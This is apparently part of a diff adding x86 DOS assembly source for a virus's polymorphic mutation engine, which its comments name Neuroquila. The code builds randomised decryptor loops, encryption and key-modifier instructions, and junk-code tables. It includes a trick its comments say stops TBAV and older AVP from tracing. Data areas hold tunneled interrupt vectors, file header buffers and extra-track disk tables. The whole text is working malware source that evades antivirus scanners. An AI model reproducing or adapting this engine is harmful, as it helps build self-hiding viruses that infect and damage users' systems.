+addr_increase_table     dw      offset gen_two_inc_addr
+			dw      offset gen_add_addr
+			dw      offset gen_sub_addr
+			dw      offset gen_lea_addr
+
+; Table for addresscompare
+tbl_adr_cmp     dw      offset gen_direct_addr_cmp
+		dw      offset gen_sub_addr_cmp
+		dw      offset gen_negadd_addr_cmp
+		dw      offset gen_si_to_ax_addr_cmp
+
+set_reg_table   dw      offset set_reg1         ; 0E78
+		dw      offset set_reg2         ; 0E7A
+		dw      offset set_reg3         ; 0E7E
+		dw      offset set_reg4         ; 0E80
+
+si_to_ax        db      08Bh, 0C6h              ; MOV AX,SI
+		db      089h, 0F0h              ; MOV AX,SI
+		db      08Dh, 004h              ; LEA AX,[SI]
+		db      056h, 058h              ; PUSH SI ; POP AX
+
+first_jmp_table         db      074h, 077h, 073h, 074h  ; je/ja/jnb/je
+second_jmp_table        db      0EBh, 075h, 0E9h, 072h  ; jmp8/jnz/jmp16/jb
+
+cs_to_ds        dw      offset init_ds3
+		dw      offset init_ds1
+		dw      offset init_ds2
+		dw      offset init_ds2
+
+engine_data:
+
+date    db      ?,?,?
+time    db      ?,?,?,?
+
+int13_counter   dw      ?
+int21_counter   dw      ?
+loop_begin_pos          dw      ?
+cond_jmp_pos            dw      ?
+init_addr_pos           dw      ?
+cmp_addr_pos            dw      ?
+
+@@145   dw      ?
+
+si_di_bx        db      6, 7, 3, 3
+addr_regs       db      4, 5, 7, 7              ; [si], [di] or [bx]
+encr_reg1       db      1, 2, 5                 ; cx, dx or bp
+encr_reg2       db      08h, 10h, 28h           ; cx, dx or bp in XOR
+@@393   db      74h, 7dh, 5fh, 5fh
+
+junk_table      dw      offset junk_0   ; nothing
+		dw      offset junk_1   ; CLD
+		dw      offset junk_2   ; LEA AX,[random16]
+		dw      offset junk_3   ; STD
+		dw      offset junk_4   ; MOV AH,random8
+		dw      offset junk_5   ; CLI
+		dw      offset junk_6   ; STI
+		dw      offset junk_7   ; MOV AL,random8
+		dw      offset junk_8   ; MOV AX,random_reg16
+		dw      offset junk_9   ; MOV AX,random16
+		dw      offset junk_a   ; NOP
+		dw      offset junk_b   ; CBW
+		dw      offset junk_c   ; AND AX,random16
+		dw      offset junk_d   ; OR AX,random16
+		dw      offset junk_e   ; MOV AH,4Dh; INT 21h
+		dw      offset junk_f   ; CLC; JNC $+3; JMP xxxx:xxxx
+
+;=======================================================================;
+; Functions for modifying the encryption value I                        ;
+;=======================================================================;
+
+;-----------------------------------------------;
+; Generate ADD/SUB encr_val,[modifier_value]    ;
+;-----------------------------------------------;
+gen_add_sub_modifier:
+	mov     ax,05C0h
+	test    dh,1
+	jz      gen_add_modifier
+	mov     ax,2DE8h
+gen_add_modifier:
+	call    insert_encr_reg1
+	mov     [bx+ offset encr_val_method_of_modify - offset engine_data],ah
+;       mov     ax,45CCh
+	db      0B8h
+modifier_value  dw      45CCh
+	stosw
+	mov     [bx+ offset encr_val_modifier -offset engine_data],ax
+	ret
+
+;----------------------------------------;
+; Generate XOR encr_val,[modifier_value] ;
+;----------------------------------------;
+gen_xor_modifier:
+	mov     ax,35F0h
+	jmp     gen_add_modifier        ; here a xor-modifier is generated
+					; instead
+
+;=======================================================================;
+; Functions for de/encryption I                                         ;
+;=======================================================================;
+
+;---------------------------------------;
+; Generate XOR [],encr_val              ;
+;---------------------------------------;
+gen_direct_xor_encryption:
+	mov     al,30h
+	call    insert_addr_reg2
+	mov     byte ptr [bx+ offset encr_opcode1 - offset engine_data],31h
+put_encryption_value:
+;       mov     ax,7682h
+	db      0B8h
+encr_val1       dw      7682h
+	stosw
+	ret
+
+;=======================================================================;
+; Functions for modifying the encryption value II                       ;
+;=======================================================================;
+
+;---------------------------------------;
+; Generate ROL/ROR encr_val,1           ;
+;---------------------------------------;
+gen_rol_ror_modifier:
+	dec     di
+	mov     al,0D1h
+	stosb
+	mov     [bx+ offset encr_val_method_of_modify - offset engine_data],al
+								; ROx AX,1
+	mov     ax,0C0C0h       ; ROL
+	test    dh,1
+	jz      gen_rol_modifier
+	mov     ax,0C8C8h       ; ROR
+gen_rol_modifier:
+	call    insert_encr_reg1
+	mov     al,90h
+	xchg    al,ah
+	mov     [bx+ offset encr_val_modifier - offset engine_data],ax
+							; => ROx AX,1; NOP
+	ret
+
+;=======================================================================;
+; Functions for de/encryption II                                        ;
+;=======================================================================;
+
+;---------------------------------------;
+; Generate ADD [],encr_val              ;
+;---------------------------------------;
+gen_direct_add_encryption:
+	mov     al,0            ; ADD
+gen_direct_add_sub_encryption:
+	call    insert_addr_reg2
+	xor     al,28h
+@@335:
+	and     al,0F8h
+	inc     ax
+	mov     [bx+ offset encr_opcode1 - offset engine_data],al
+	jmp     put_encryption_value
+
+;---------------------------------------;
+; Generate SUB [],encr_val              ;
+;---------------------------------------;
+gen_direct_sub_encryption:
+	mov     al,28h          ; SUB
+	jmp     gen_direct_add_sub_encryption
+
+;---------------------------------------;
+; Generate ADC [],encr_val              ;
+;---------------------------------------;
+gen_direct_adc_encryption:
+	mov     al,10h          ; ADC
+gen_direct_adc_sbb_encryption:
+	call    insert_addr_reg2
+	xor     al,8
+	jmp     @@335
+
+;---------------------------------------;
+; Generate SBB [],encr_val              ;
+;---------------------------------------;
+gen_direct_sbb_encryption:
+	mov     al,18h          ; SBB
+	jmp     gen_direct_adc_sbb_encryption
+
+
+insert_encr_reg1:
+	mov     si,[bx+ offset time - offset engine_data]
+	and     si,3
+	add     al,byte ptr [bx+si+ offset encr_reg1-1 - offset engine_data]  ;[bx+si+1ch]
+	stosb
+	ret
+
+insert_addr_reg1:
+	mov     si,dx
+	and     si,3
+	add     al,byte ptr [bx+si+ offset si_di_bx - offset engine_data]
+	stosb
+	ret
+
+insert_addr_reg2:
+	mov     si,dx
+	and     si,3
+	add     al,[bx+si + offset addr_regs - offset engine_data]
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate XOR [  ],(cx/dx/bp)          ;
+;---------------------------------------;
+gen_xor_encryption:
+	mov     al,31h
+	stosb
+	mov     [bx+ offset encr_opcode1 - offset engine_data],al
+insert_encr_reg2:
+	mov     al,0
+	mov     si,[bx+ offset time - offset engine_data]
+	and     si,3
+	add     al,[bx+si+ offset encr_reg2-1 - offset engine_data]             ;[bx+si+1fh]
+	jmp     insert_addr_reg2
+
+;---------------------------------------;
+; Generate ADD [  ],(cx/dx/bp)          ;
+;---------------------------------------;
+
+gen_add_encryption:
+	mov     al,1            ; ADD
+add_sub_encr:
+	stosb
+	xor     al,28h          ; ADD->SUB , SUB-> ADD for encryption
+	mov     [bx+ offset encr_opcode1 - offset engine_data],al
+	jmp     insert_encr_reg2
+
+;---------------------------------------;
+; Generate ADD [  ],(cx/dx/bp)          ;
+;---------------------------------------;
+
+gen_sub_encryption:
+	mov     al,29h          ; SUB
+	jmp     add_sub_encr
+
+;---------------------------------------;
+; Generate ADC [  ],(cx/dx/bp)          ;
+;---------------------------------------;
+
+gen_adc_encryption:
+	mov     al,11h          ; ADC
+adc_sbb_encr:
+	stosb
+	xor     al,8            ; ADC -> SBB, SBB -> ADC for encryption
+	mov     [bx+ offset encr_opcode1 - offset engine_data],al
+	jmp     insert_encr_reg2
+
+;---------------------------------------;
+; Generate SBB [  ],(cx/dx/bp)          ;
+;---------------------------------------;
+
+gen_sbb_encryption:
+	mov     al,19h          ; SBB
+	jmp     adc_sbb_encr
+
+;---------------------------------------;
+; Generate NOT word ptr [  ]            ;
+;---------------------------------------;
+gen_not_encryption:
+	mov     ax,15F7h                ; NOT WORD PTR [DI]
+	stosb
+	mov     [bx+ offset encr_opcode1 - offset engine_data],ax
+	mov     al,10h                  ; NOT WORD PTR [?]
+	jmp     insert_addr_reg2
+
+;---------------------------------------;
+; Generate NEG word ptr [  ]            ;
+;---------------------------------------;
+gen_neg_encryption:
+	mov     ax,1DF7h                ; NEG WORD PTR [DI]
+	stosb
+	mov     [bx+ offset encr_opcode1 - offset engine_data],ax
+	mov     al,18h                  ; NEG WORD PTR [?]
+	jmp     insert_addr_reg2
+
+;---------------------------------------;
+; Generate ROL/ROR word ptr [  ],1      ;
+;---------------------------------------;
+gen_rol_ror_encryption:
+	mov     al,0D1h                 ; ROL
+	stosb
+	mov     [bx+ offset encr_opcode1 - offset engine_data],al
+	mov     al,0
+	test    bp,1
+	jz      gen_rol_encryption
+	xor     al,8                    ; ROR
+gen_rol_encryption:
+	call    insert_addr_reg2
+	and     al,8
+	or      al,5                    ; use [DI] for encryption
+	xor     al,8                    ; ROL <-> ROR for encryption
+	mov     [bx+ offset encr_opcode2 - offset engine_data],al
+	ret
+
+;=======================================================================;
+; Functions for increasing the address by 2                             ;
+;=======================================================================;
+
+;---------------------------------------;
+; Generate 2x INC addr_reg              ;
+;---------------------------------------;
+gen_two_inc_addr:
+	test    cl,5
+	jz      gen_alt_two_inc_addr
+	mov     al,40h
+	call    insert_addr_reg1
+	push    ax
+	mov     al,0fh
+	call    gen_limit_junk
+	pop     ax
+	stosb
+	ret
+gen_alt_two_inc_addr:
+	mov     al,0FFh
+	stosb
+	mov     al,0C0h
+	call    insert_addr_reg1
+	mov     ax,word ptr es:[di-2]
+	stosw
+	ret     
+
+;---------------------------------------;
+; Generate ADD addr_reg,word/byte ptr 2 ;
+;---------------------------------------;
+gen_add_addr:
+	mov     ah,0C0h
+	call    gen_word_byte_prefix
+prepare_word_byte_choose:
+	mov     al,2
+	jmp     word_byte_choose
+
+;-----------------------------------------;
+; Generate SUB addr_reg,word/byte ptr -2  ;
+;-----------------------------------------;
+gen_sub_addr:
+	mov     ah,0E8h
+	call    gen_word_byte_prefix
+	mov     al,0FEh
+word_byte_choose:
+	test    dh,3
+	jz      put_opcode_byte
+	cbw
+	stosw
+	ret     
+
+;---------------------------------------;
+; Generate ADD/SUB addr_reg,?           ;
+;---------------------------------------;
+gen_word_byte_prefix:
+	mov     al,83h
+	test    dh,3
+	jz      gen_byte_prefix
+	xor     al,2
+gen_byte_prefix:
+	stosb
+	mov     al,ah
+	jmp     insert_addr_reg1
+
+;-----------------------------------------------;
+; Generate LEA addr_reg,[addr_reg+ byte/word 2] ;
+;-----------------------------------------------;
+gen_lea_addr:
+	mov     al,8Dh
+	stosb
+	mov     si,dx
+	and     si,3
+	mov     al,[bx+si+ offset @@393 - offset engine_data]
+	test    dh,3
+	jz      @@347
+	add     al,40h
+@@347:
+	stosb
+	jmp     prepare_word_byte_choose
+
+;=======================================================================;
+; The functions for the address-compare                                 ;
+;=======================================================================;
+
+;---------------------------------------;
+; Generate CMP (si/di/dx),data16        ;
+;---------------------------------------;
+gen_direct_addr_cmp:
+	mov     al,81h
+	stosb
+	mov     al,0F8h         ; CMP reg16,
+	call    insert_addr_reg1                ; choose reg
+
+save_cmp_adr:
+	mov     [bx+ offset cmp_addr_pos - offset engine_data],di       ; [bx+11h]
+	stosw
+	ret
+
+;---------------------------------------;
+; Generate SUB ax,(si/di/dx) ; CMC      ;
+;---------------------------------------;
+gen_sub_addr_cmp:
+	mov     al,0B8h         ; MOV AX,
+	stosb
+	call    save_cmp_adr    ; save position and keep 2 bytes free
+	mov     al,2Bh          ; SUB
+	stosb
+insert_addr_reg3:
+	mov     al,0C0h
+	call    insert_addr_reg1                ; insert reg from si_di_bx
+	mov     al,0F5h         ; CMC
+put_opcode_byte:
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate NEG ax; ADD ax,(si/di/dx)    ;
+;---------------------------------------;
+gen_negadd_addr_cmp:
+	mov     al,0B8h         ; MOV AX,
+	stosb
+	call    save_cmp_adr    ; Save position and keep 2 byte free
+	mov     ax,0D8F7h       ; NEG AX
+	stosw
+	mov     al,3            ; ADD AX,
+	stosb
+	jmp     insert_addr_reg3
+
+;-----------------------------------------------;
+; Generate                                      ;
+; ( MOV AX,SI / LEA AX,[SI] / PUSH SI; POP AX ) ;
+; ; CMP AX,value16                              ;
+;-----------------------------------------------;
+gen_si_to_ax_addr_cmp:
+	mov     ax,dx
+	and     al,3
+	jnz     gen_direct_addr_cmp             ; if not si
+	mov     si,[bx+offset int21_counter - offset engine_data]  ;[bx+9]
+	and     si,3
+	shl     si,1
+	add     si,offset si_to_ax
+	movsw           ; any of the methods to put value of SI into AX
+	mov     al,3Dh
+	stosb                   ; cmp   ax,value16
+	jmp     save_cmp_adr    ; save position
+
+;=======================================================================;
+; The functions for the address-init                                    ;
+;=======================================================================;
+
+;---------------------------------------;
+; Generate MOV reg16,value16            ;
+;---------------------------------------;
+set_reg1:
+	mov     al,0B8h                 ; MOV reg16,value16
+insert_mov_reg16:
+	add     al,[bp+2]               ; reg16
+insert_mov_value16:
+	stosb                           ; store 2nd byte of opcode
+	mov     ax,[bp+4]               ; value16
+	stosw                           ; store it
+	ret
+
+;---------------------------------------;
+; Generate MOV reg16,value16            ;
+;---------------------------------------;
+set_reg2:
+	mov     al,0C7h
+	stosb
+	mov     al,0C0h
+	jmp     insert_mov_reg16
+
+;----------------------------------------;
+; Generate LEA reg16,["word ptr [bp+4]"] ;
+; reg16 - [bp+6]                         ;
+;----------------------------------------;
+set_reg3:
+	mov     al,8Dh                  ; LEA
+	stosb
+	mov     al,[bp+2]               ; reg16
+	cbw
+	shl     ax,3
+	add     al,6                    ; LEA ..,[address]
+	jmp     insert_mov_value16      ; store second byte of opcode
+					; and the address from [bp+4]
+
+;---------------------------------------;
+; Generate Register-Init                ;
+; Input:                                ;
+;  byte ptr [bp+2]                      ;
+; [     0       AL,AH                ]  ;
+;       1       CL,CH                   ;
+;       2       DL,DH                   ;
+;       3       BL,BH                   ;
+; [     4       not suitable         ]  ;
+;       5       PUSH value16; POP BP    ;
+;       6       PUSH value16; POP SI    ;
+;       7       PUSH value16; POP DI    ;
+; bit 1 of DI                           ;
+;   decides which of the 8 bit regs is  ;
+;   installed first ([bp+2]=0..3)       ;
+;   1 = higher one first                ;
+; [] here means never called with this  ;
+;    value                              ;
+; 1,2,5 used for encryption value       ;
+; 3,4,7 used for address value          ;
+;---------------------------------------;
+set_reg4:
+	cmp     byte ptr [bp+2],4
+	ja      push_pop_reg_set                ; only for BP,SI and DI
+	mov     al,0B0h         ; MOV reg8,"byte ptr [bp+4]" (al,cl,dl,bl)
+	mov     ah,[bp+4]       ; lower byte of 16bit value
+	add     al,[bp+2]
+	xchg    si,ax
+	mov     al,0B4h         ; MOV reg8,"byte ptr [bp+4]" (ah,ch,dh,bh) 
+	mov     ah,[bp+5]       ; higher byte of 16bit value
+	add     al,[bp+2]
+	test    di,1            ; Bit 1 of DI setted = init higher byte
+	jnz     higher_byte_first
+	xchg    si,ax
+higher_byte_first:
+	stosw
+	xchg    si,ax
+	stosw                   ; put the opcode
+	ret
+
+push_pop_reg_set:
+	; Generate
+	; 1. PUSH "word ptr [bp+4]"
+	; 2. POP "reg16 = byte ptr [bp+2]"
+	mov     al,68h          ; PUSH value16
+	stosb
+	mov     ax,[bp+4]       ; value16
+	stosw
+	mov     al,58h          ; POP reg16
+	add     al,[bp+2]       ; reg16
+	stosb
+	ret
+
+;==========================================================================
+; Functions for junk-instructions
+;==========================================================================
+
+genjunk_9:
+	; Generate only junk that does not change used flags
+	mov     al,9
+gen_limit_junk:
+	; called with al=0fh means all junk codes possible
+	cbw
+	xchg    si,ax
+test_junk_limit:
+	call    random
+	and     ax,0fh
+	cmp     ax,si
+	ja      test_junk_limit
+	shl     ax,1
+	xchg    si,ax
+	jmp     word ptr [bx+si+ offset junk_table - offset engine_data]
+
+random:
+	push    bx
+	push    ds
+	push    cs
+	pop     ds
+;       mov     bx,0497h
+	db      0BBh
+rand_seed       dw      0497h
+	mov     ax,[bx]
+	pop     ds
+assume  ds:nothing
+	inc     bx
+	add     bx,di
+	and     bh,1fh
+	mov     rand_seed,bx
+	pop     bx
+	ret
+	; 10E9
+
+;---------------------------------------;
+; Generate CLD                          ;
+;---------------------------------------;
+junk_1:
+	mov     al,0FCh
+	stosb
+;---------------------------------------;
+; Generate nothing                      ;
+;---------------------------------------;
+junk_0:
+	ret
+
+;---------------------------------------;
+; Generate STD                          ;
+;---------------------------------------;
+junk_3:
+	mov     al,0FDh
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate NOP                          ;
+;---------------------------------------;
+junk_a:
+	mov     al,90h
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate CLI                          ;
+;---------------------------------------;
+junk_5:
+	mov     al,0FAh
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate STI                          ;
+;---------------------------------------;
+junk_6:
+	mov     al,0FBh
+	stosb
+	ret
+
+	; never used !!!
+	ret             ; maybe thought for junk_0
+
+;---------------------------------------;
+; Generate CBW                          ;
+;---------------------------------------;
+junk_b:
+	mov     al,98h
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate CLC; JNC $+3; JMP xxxx:xxxx  ;
+; x is code again                       ;
+; it's like JUMP-virus :-)              ;
+;---------------------------------------;
+junk_f:
+	mov     ax,73F8h
+	stosw
+	mov     ax,0EA01h
+	stosw
+	ret
+
+;---------------------------------------;
+; Generate MOV AL,random8               ;
+;---------------------------------------;
+junk_7:
+	mov     al,0B0h
+
+put_random_byte_operation:
+	stosb
+	call    random
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate MOV AH,random8               ;
+;---------------------------------------;
+junk_4:
+	mov     al,0B4h
+	jmp     put_random_byte_operation
+
+;---------------------------------------;
+; Generate MOV AX,random_reg16          ;
+;---------------------------------------;
+junk_8:
+	mov     al,8Bh
+	stosb
+	call    random
+	and     al,7
+	add     al,0C0h
+	stosb
+	ret
+
+;---------------------------------------;
+; Generate MOV AX,random16              ;
+;---------------------------------------;
+junk_9:
+	mov     al,0B8h
+
+put_junk_byte:
+	stosb
+put_random_word:
+	call    random
+	stosw
+	ret
+
+;---------------------------------------;
+; Generate MOV AH,4Dh; INT 21h          ;
+; Call DOS-Function 'Get Exit-Code'     ;
+; This forces TBAV and earlier versions ;
+; of AVP to stop tracing                ;
+;---------------------------------------;
+junk_e:
+	mov     ax,4DB4h
+	stosw
+	mov     ax,21CDh
+	stosw
+	ret
+
+;---------------------------------------;
+; Generate LEA AX,[random16]            ;
+;---------------------------------------;
+junk_2:
+	mov     ax,068Dh
+	stosw
+	jmp     put_random_word
+
+;---------------------------------------;
+; Generate AND AX,random16              ;
+;---------------------------------------;
+junk_c:
+	mov     al,25h
+	jmp     put_junk_byte
+	
+;---------------------------------------;
+; Generate OR AX,random16               ;
+;---------------------------------------;
+junk_d:
+	mov     al,0Dh
+	jmp     put_junk_byte
+
+;===========================================================================
+; Functions for register initialisation
+;===========================================================================
+
+init_ds:
+	call    genjunk_9
+	mov     si,[bx+offset int21_counter - offset engine_data] ;[bx+9]
+	and     si,3
+	shl     si,1
+	jmp     word ptr [bx+si+offset cs_to_ds - offset engine_data]   ; [bx+si-8]
+
+;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+; Sub-functions for init_ds
+
+init_ds1:
+	mov     ax,0C88Ch               ; MOV AX,CS
+	stosw
+	mov     ax,0D88Eh               ; MOV DS,AX
+	stosw
+	ret
+
+init_ds2:
+	mov     al,0eh                  ; PUSH CS
+	stosb
+	call    genjunk_9
+	mov     al,1fh                  ; POP DS
+	stosb
+init_ds3:
+	ret
+
+;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+init_encr_val:
+	mov     al,cl
+	and     al,7
+	cmp     al,4
+	ja      ret2
+	test    byte ptr [bx+ offset time - offset engine_data],3
+	jz      ret2
+	call    genjunk_9
+	; set encryption value in virus-body also
+	mov     ax,[bx+ offset encr_val1 - offset engine_data]
+	mov     [bx+ offset encr_val2 - offset engine_data],ax
+	; save encryption value to stack
+	push    ax              ; [bp+4] value16
+	; get register for encr_value from time
+	mov     si,[bx+ offset time - offset engine_data]
+	and     si,3
+	mov     al,byte ptr [bx+si+offset encr_reg1-1 - offset engine_data]
+	;
+	mov     si,[bx+ offset time - offset engine_data]
+
+gen_set_reg:
+	; AX == reg to set
+	cbw
+	push    ax              ; [bp+2] reg16
+;       db      0C1h,0EEh,03h
+	shr     si,3
+	and     si,3
+	push    bp
+	mov     bp,sp
+	shl     si,1
+	call    word ptr [bx+si+ offset set_reg_table - offset engine_data]     ;[bx+si-20h]
+	pop     bp
+	pop     ax
+	pop     ax
+	ret
+
+; Bits 0..2 of DX == reg to use for addr
+init_addr:
+	call    genjunk_9
+	mov     [bx+ offset init_addr_pos - offset engine_data],di
+					; save position
+;       push    0FEh            ; [bp+4] value16
+	db      6Ah,0FEh
+	; load register value for SI,DI or BX
+	mov     si,dx
+	and     si,3
+	mov     al,[bx+si+ offset si_di_bx - offset engine_data]
+	mov     si,dx
+	jmp     gen_set_reg
+
+;===========================================================================
+; call-table functions for address-increase and encryption-value-modifier
+;===========================================================================
+
+gen_addr_inc:
+	mov     al,0fh
+	call    gen_limit_junk
+	mov     si,[bx+ offset time - offset engine_data + 1]
+	and     si,3
+	shl     si,1
+	call    word ptr [bx+si+ offset addr_increase_table - offset engine_data]
+ret2:   ret
+
+gen_modifier:
+	mov     al,cl
+	and     al,7
+	cmp     al,4
+	ja      ret2
+	mov     al,ch
+	and     ax,3
+	shl     ax,1
+	xchg    si,ax
+	jz      ret2
+	test    byte ptr [bx+ offset time - offset engine_data],3
+	jz      ret2
+	push    si
+	mov     al,0fh
+	call    gen_limit_junk
+	pop     si
+	mov     al,81h
+	stosb
+	jmp     word ptr [bx+si+ offset modifier_table - offset engine_data]
+
+
+;---------------------------------------------------------------------------------------;
+; End of the Mutation-Engine of Neuroquila                                                      ;
+;---------------------------------------------------------------------------------------;
+
+	; this table to the disk-tables never used
+	dw      offset disk_525
+	dw      offset disk_35
+
+	; Tables of drive characteristics for enabling the extra-track
+disk_525        db  0DFh, 02h, 25h, 02h, 0Fh, 1Bh, 0FFh, 54h, 0F6h, 0Fh, 08h
+disk_35         db  0DFh, 02h, 25h, 02h, 12h, 1Bh, 0FFh, 6Ch, 0F6h, 0Fh, 08h
+		db  0
+
+my_size:
+
+;---------------------------------------------------------------------------------------;
+; The external data area                                                                ;
+;---------------------------------------------------------------------------------------;
+
+org     1204h
+vir_dta         db      3fh dup (?)
+head_buff       db      1eh dup (?)
+l_org_fsize     dw      ?
+h_org_fsize     dw      ?
+head_encr_val   dw      ?
+disk_table      db      4*10 dup (?)
+disk_buff       db      200h dup (?)
+tunneled_ofs    dw      ?
+tunneled_seg    dw      ?
+tun21_ofs       dw      ?
+tun21_seg       dw      ?
+xms_addr        dd      ?
+filename        db      41h dup (?)
+
+memory_top:
+
+code2      ends
+
+	end     start
